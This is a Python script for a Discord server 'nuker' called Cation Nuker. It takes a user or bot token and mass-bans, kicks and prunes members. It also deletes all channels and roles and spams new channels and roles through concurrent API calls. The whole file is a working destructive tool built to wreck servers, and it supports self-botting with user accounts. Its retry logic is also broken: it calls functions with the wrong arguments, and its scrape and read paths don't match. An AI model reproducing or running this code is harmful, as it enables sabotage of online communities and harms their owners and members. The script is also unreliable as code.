import asyncio
import aiohttp
import tasksio
import discord
import colorama
import os
import requests
from discord.ext import commands

token = input(f"\n> Token [~]: ")

def checkT(token):
  if requests.get("https://discord.com/api/v9/users/@me", headers={"authorization": token}).status_code == 200:
    return "user"
  else:
    return "bot"
token_type = checkT(token)
if token_type == "user":
  headers = {'authorization': token}
  client = commands.Bot(command_prefix="bhenchodidkk", intents=discord.Intents.all(), self_Bot=True)
elif token_type == "bot":
  headers = {'authorization': f'Bot {token}'}
  client = commands.Bot(command_prefix="bhenchodidkk", intents=discord.Intents.all())
os.system("clear")
members = open("Cation Nuker/members.txt").read().split("\n")
channels = open("Cation Nuker/channels.txt").read().split("\n")
roles = open("Cation Nuker/roles.txt").read().split("\n")

class playz:
  async def scrape(g):
    guild = client.get_guild(int(g))
    member = guild.members
    channel = guild.channels
    role = guild.roles

    try:
        os.remove("Cation Nuker/members.txt")
        os.remove("Cation Nuker/channels.txt")
        os.remove("Cation Nuker/roles.txt")
    except:
        pass
      
    with open("SpeedTown/members.txt", "a") as f:
      for m in member:
        f.write(f"{m.id}\n")
      f.close()
    with open("SpeedTown/channels.txt", "a") as f:
      for ch in channel:
        f.write(f"{ch.id}\n")
      f.close()
    with open("SpeedTown/roles.txt", "a") as f:
      for r in role:
        f.write(f"{r.id}\n")
      f.close()
    os.system("clear")
    print(f"Scraped {len(member)} members!\nScraped {len(channel)} channels!\nScraped {len(role)} roles!\nRestart nuker to use it!") 
    
  async def ban(g, m):
    async with aiohttp.ClientSession() as s:
      async with s.put(f"https://discord.com/api/v9/guilds/{g}/bans/{m}", headers=headers) as ss:
        if ss.status in (200, 201, 204):
          print(f"\033[32m[$] Banned {m}\033[0m")
        else:
          try:
            print(f"\033[31m[$] Retrying to ban {m}\033[0m")
            await playz.ban(m)
          except:
            print(f"\033[31m[$] Couldn't ban {m}\033[0m")

  async def kick(g, m):
    async with aiohttp.ClientSession() as s:
      async with s.delete(f"https://discord.com/api/v9/guilds/{g}/members/{m}", headers=headers) as ss:
        if ss.status in (200, 201, 204):
          print(f"\033[32m[$] Kicked {m}\033[0m")
        else:
          try:
            print(f"\033[31m[$] Retrying to kick {m}\033[0m")
            await playz.ban(m)
          except:
            print(f"\033[31m[$] Couldn't kick {m}\033[0m")
  
  async def unban(g, m):
    async with aiohttp.ClientSession() as s:
      async with s.delete(f"https://discord.com/api/v9/guilds/{g}/bans/{m}", headers=headers) as ss:
        if ss.status in (200, 201, 204):
          print(f"\033[32m[$] Unbanned {m}\033[0m")
        else:
          try:
            print(f"\033[31m[$] Retrying to unban {m}\033[0m")
            await playz.ban(m)
          except:
            print(f"\033[31m[$] Couldn't unban {m}\033[0m")
  
  async def roledel(g, r):
    async with aiohttp.ClientSession() as s:
      async with s.delete(f"https://discord.com/api/v9/guilds/{g}/roles/{r}", headers=headers) as ss:
        if ss.status in (200, 201, 204):
          print(f"\033[32m[$] Deleted {r}\033[0m")
        else:
          try:
            print(f"\033[31m[$] Retrying to delete {r}\033[0m")
            await playz.roledel(r)
          except:
            print(f"\033[31m[$] Couldn't delete {r}\033[0m")

  async def chdel(ch):
    async with aiohttp.ClientSession() as s:
      async with s.delete(f"https://discord.com/api/v9/channels/{ch}", headers=headers) as ss:
        if ss.status in (200, 201, 204):
          print(f"\033[32m[$] Deleted {ch}\033[0m")
        else:
          try:
            print(f"\033[31m[$] Retrying to delete {ch}\033[0m")
            await playz.chdel(ch)
          except:
            print(f"\033[31m[$] Couldn't delete {ch}\033[0m")

  async def chcreate(g, name, type):
    async with aiohttp.ClientSession() as s:
      json = {
        "name": name,
        "type": type
      }
      async with s.post(f"https://discord.com/api/v9/guilds/{g}/channels", headers=headers, json=json) as ss:
        if ss.status in (200, 201, 204):
          print(f"\033[32m[$] Created {name}\033[0m")
        else:
          try:
            print(f"\033[31m[$] Retrying to create {name}\033[0m")
            await playz.chcreate(g, name, type)
          except:
            print(f"\033[31m[$] Couldn't create {name}\033[0m")

  async def rcreate(g, name):
    async with aiohttp.ClientSession() as s:
      json = {
        "name": name
      }
      async with s.post(f"https://discord.com/api/v9/guilds/{g}/roles", headers=headers, json=json) as ss:
        if ss.status in (200, 201, 204):
          print(f"\033[32m[$] Created {name}\033[0m")
        else:
          try:
            print(f"\033[31m[$] Retrying to create {name}\033[0m")
            await playz.rcreate(g, name)
          except:
            print(f"\033[31m[$] Couldn't create {name}\033[0m")
  
  async def prune(g):
    guild = client.get_guild(int(g))
    await guild.prune_members(days=1, roles=guild.roles, reason="Nuked by Cation, discord.gg/ctnop")
    os.system("clear")
    print(f"\033[1;49;32m[$] Pruned {guild.name} successfully\033[0m")
    
  async def pruneexec():
    os.system("clear")
    g = input("[$] Guild: ")
    await playz.prune(g)
    
  async def banexec():
    os.system("clear")
    g = input("[$] Guild: ")
    async with tasksio.TaskPool(13) as p:
      for m in members:
        await p.put(playz.ban(g, m))

  async def kickexec():
    os.system("clear")
    g = input("[$] Guild: ")
    async with tasksio.TaskPool(13) as p:
      for m in members:
        await p.put(playz.kick(g, m))
  
  async def unbanexec():
    os.system("clear")
    g = input("[$] Guild: ")
    async with tasksio.TaskPool(13) as p:
      for m in members:
        await p.put(playz.unban(g, m))
  
  async def roledelexec():
    os.system("clear")
    g = input("[$] Guild: ")
    async with tasksio.TaskPool(13) as p:
      for r in roles:
        await p.put(playz.roledel(g, r))

  async def chdelexec():
    os.system("clear")
    async with tasksio.TaskPool(13) as p:
      for ch in channels:
        await p.put(playz.chdel(ch))

  async def chcreateexec():
    os.system("clear")
    g = input("[$] Guild: ")
    name = input("[$] Channel Name: ")
    t = input("[$] Voice channel [y/n]: ")
    if t == "y":
      type = 2
    elif t == "n":
      type = 0
    else:
      print("invalid option ;-;")
      return
    amount = input("[$] Amount: ")
    async with tasksio.TaskPool(13) as p:
      for xxo in range(int(amount)):
        await p.put(playz.chcreate(g, name, type))

  async def rcreateexec():
    os.system("clear")
    g = input("[$] Guild: ")
    name = input("[$] Role name: ")
    a = input("[$] Amount: ")
    async with tasksio.TaskPool(13) as p:
      for ch in range(int(a)):
        await p.put(playz.rcreate(g, name))
  
  async def main():
    os.system("title CATION NUKER | discord.gg/ctnop")
    print("""


                                
                                                                

░█████╗░░█████╗░████████╗██╗░█████╗░███╗░░██╗
██╔══██╗██╔══██╗╚══██╔══╝██║██╔══██╗████╗░██║
██║░░╚═╝███████║░░░██║░░░██║██║░░██║██╔██╗██║
██║░░██╗██╔══██║░░░██║░░░██║██║░░██║██║╚████║
╚█████╔╝██║░░██║░░░██║░░░██║╚█████╔╝██║░╚███║
░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░╚════╝░╚═╝░░╚══╝                                               
                                                   
                                                                                                                                                                                                               


  \033[33m1: Ban users        2: Unban users
  3: Scrape           4: Kick users
  5: Create channels  6: Delete channels
  7: Create roles     8: Delete roles
  9: Prune users\033[0m   
          """)
    ch = int(input("Choice: "))
    if ch == 3:
      os.system("clear")
      g = input("[$] Guild: ")
      await playz.scrape(g)
      await asyncio.sleep(5)
      os.system("clear")
      await playz.main()
    elif ch == 1:
      await playz.banexec()
      await asyncio.sleep(5)
      os.system("clear")
    elif ch == 2:
      await playz.unbanexec()
      await asyncio.sleep(5)
      os.system("clear")
      await playz.main()
    elif ch == 9:
      await playz.pruneexec()
      await asyncio.sleep(5)
      os.system("clear")
      await playz.main()
    elif ch == 8:
      await playz.roledelexec()
      await asyncio.sleep(5)
      os.system("clear")
      await playz.main()
    elif ch == 6:
      await playz.chdelexec()
      await asyncio.sleep(5)
      os.system("clear")
      await playz.main()
    elif ch == 5:
      await playz.chcreateexec()
      await asyncio.sleep(5)
      os.system("clear")
      await playz.main()
    elif ch == 7:
      await playz.rcreateexec()
      await asyncio.sleep(5)
      os.system("clear")
      await playz.main()
    elif ch == 4:
      await playz.kickexec()
      await asyncio.sleep(5)
      os.system("clear")
      await playz.main()
    else:
      os.system("clear")
      print("invalid")
      await asyncio.sleep(5)
      os.system("clear")
      await playz.main()
client.remove_command("help")

@client.event
async def on_ready():
  await client.change_presence(status=discord.Status.offline)
  await playz.main()

if token_type == "user":
  client.run(token, bot=False)
elif token_type == "bot":
  client.run(token)
